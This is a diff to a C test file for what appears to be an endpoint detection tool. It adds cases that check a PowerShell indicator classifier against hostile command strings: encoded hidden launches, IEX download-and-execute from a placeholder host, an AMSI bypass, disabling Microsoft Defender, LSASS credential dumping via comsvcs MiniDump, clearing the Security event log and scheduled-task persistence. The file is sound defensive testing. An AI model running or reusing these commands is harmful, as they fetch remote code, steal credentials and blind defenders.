@@ -687,6 +687,29 @@ int main(void)
         check_int("rmm zoom", rmm_tool_name("Zoom") == NULL, 1);
         check_int("rmm office", rmm_tool_name("Microsoft Office Professional Plus 2010") == NULL, 1);
         check_int("rmm remote desktop conn", rmm_tool_name("Remote Desktop Connection") == NULL, 1);
+        {
+            struct { const char *l, *want; } ps[] = {
+                { "powershell -nop -w hidden -enc SQBFAFgA", "encoded" },
+                { "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", "download" },
+                { "iwr http://x/a.ps1 | iex", "download" },
+                { "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "AMSI" },
+                { "Set-MpPreference -DisableRealtimeMonitoring $true", "Defender" },
+                { "Add-MpPreference -ExclusionPath C:\\Temp", "Defender" },
+                { "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full", "credential" },
+                { "wevtutil cl Security", "clearing" },
+                { "powershell -ExecutionPolicy Bypass -File x.ps1", "bypass" },
+                { "Register-ScheduledTask -TaskName u -Action $a", "persistence" },
+                { "Get-ChildItem C:\\Users", NULL },
+                { "git status", NULL },
+                { "Get-Process | Sort-Object CPU", NULL },
+            };
+            for (size_t i = 0; i < sizeof ps / sizeof ps[0]; i++) {
+                const char *r = ioc_ps_reason(ps[i].l);
+                char nm[32];
+                snprintf(nm, sizeof nm, "ps reason %u", (unsigned)i);
+                check_int(nm, ps[i].want ? (r != NULL && strstr(r, ps[i].want) != NULL) : (r == NULL), 1);
+            }
+        }
         check_int("lin lsass ok", lineage_parent_ok("lsass.exe", "wininit.exe"), 1);
         check_int("lin lsass bad", lineage_parent_ok("LSASS.EXE", "explorer.exe"), 0);
         check_int("lin svchost ok", lineage_parent_ok("svchost.exe", "services.exe"), 1);
